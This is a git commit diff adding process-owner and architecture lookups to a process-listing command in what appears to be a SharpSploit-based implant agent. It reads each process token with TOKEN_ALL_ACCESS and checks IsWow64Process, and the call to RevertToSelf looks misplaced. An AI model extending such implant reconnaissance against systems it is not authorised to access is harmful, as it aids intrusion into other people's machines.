81a906e0278cd8a7019467217009fea9e9b6a340
WG37 <willg2070@gmail.com>
2025-12-15 14:54:47 +1100

    feat(): add ProcessOwner and ProcessArchitecture properties

--- Agent/Application/Commands/ListProcess.cs
+++ Agent/Application/Commands/ListProcess.cs
@@ -1,7 +1,10 @@
 ﻿using AgentClient.Domain.Models.Agents;
 using AgentClient.Infrastructure.Utilities.SharpSploit;
+using AgentClient.Infrastructure.Native;
 using System.ComponentModel;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
 
 namespace AgentClient.Application.Commands
 {
@@ -21,14 +24,17 @@ namespace AgentClient.Application.Commands
                 {
                     ProcessName = process.ProcessName,
                     ProcessPath = GetProcessPath(process),
+                    ProcessOwner = GetProcessOwner(process),
                     ProcessId = process.Id,
-                    SessionId = process.SessionId
+                    SessionId = process.SessionId,
+                    ProcessArchitecture = GetProcessArchitecture(process)
                 };
                 results.Add(result);
             }
             return results.ToString();
         }
 
+        //if process does not have permission to file/folder print: "-"
         private string GetProcessPath(Process process)
         {
             try
@@ -39,10 +45,74 @@ namespace AgentClient.Application.Commands
             {
                 return "-";
             }
-            catch (InvalidOperationException)
+        }
+
+        private string GetProcessOwner(Process process)
+        {
+            var hToken = IntPtr.Zero;
+            try
             {
-                return "";
+                if (!Advapi32.OpenProcessToken(
+                    process.Handle,
+                    Advapi32.DesiredAccess.TOKEN_ALL_ACCESS,
+                    out hToken))
+                {
+                    int error = Marshal.GetLastWin32Error();
+                    return $"Failed to open process token. Error: {error}";
+                }
+
+                try
+                {
+                    using (var identity = new WindowsIdentity(hToken))
+                    {
+                        return identity.Name;
+                    }
+                }
+                finally
+                {
+                    Advapi32.RevertToSelf();
+                }
+
             }
+            catch (Win32Exception)
+            {
+                return "-";
+            }
+            finally
+            {
+                if (hToken != IntPtr.Zero)
+                Kernel32.CloseHandle(hToken);
+            }
+        }
+
+        private string GetProcessArchitecture(Process process)
+        {
+            var Is64Bit = Environment.Is64BitProcess;
+
+            if (!Is64Bit)
+            {
+                return "x86";
+            }
+
+            try
+            {
+                if (!Kernel32.IsWow64Process(process.Handle, out var isWow64Process))
+                {
+                    int error = Marshal.GetLastWin32Error();
+                    return $"Failed to determine process architecture. Error {error}";
+                }
+
+                if (Is64Bit && isWow64Process)
+                {
+                    return "x86";
+                }
+            }
+            catch (Win32Exception)
+            {
+                return "-";
+            }
+
+            return "x64";
         }
     }
 
@@ -50,15 +120,19 @@ namespace AgentClient.Application.Commands
     {
         public string ProcessName { get; set; }
         public string ProcessPath { get; set; }
+        public string ProcessOwner { get; set; }
         public int ProcessId { get; set; }
         public int SessionId { get; set; }
+        public string ProcessArchitecture { get; set; }
 
         protected internal override IList<SharpSploitResultProperty> ResultProperties => new List<SharpSploitResultProperty>
             {
                 new SharpSploitResultProperty {Name = nameof(ProcessName), Value = ProcessName},
                 new SharpSploitResultProperty {Name = nameof(ProcessPath), Value = ProcessPath},
+                new SharpSploitResultProperty {Name = nameof(ProcessOwner), Value = ProcessOwner},
                 new SharpSploitResultProperty {Name = "PID", Value = ProcessId},
-                new SharpSploitResultProperty {Name = nameof(SessionId), Value = SessionId }
+                new SharpSploitResultProperty {Name = nameof(SessionId), Value = SessionId },
+                new SharpSploitResultProperty {Name = nameof(ProcessArchitecture), Value = ProcessArchitecture}
             };
     }
 }
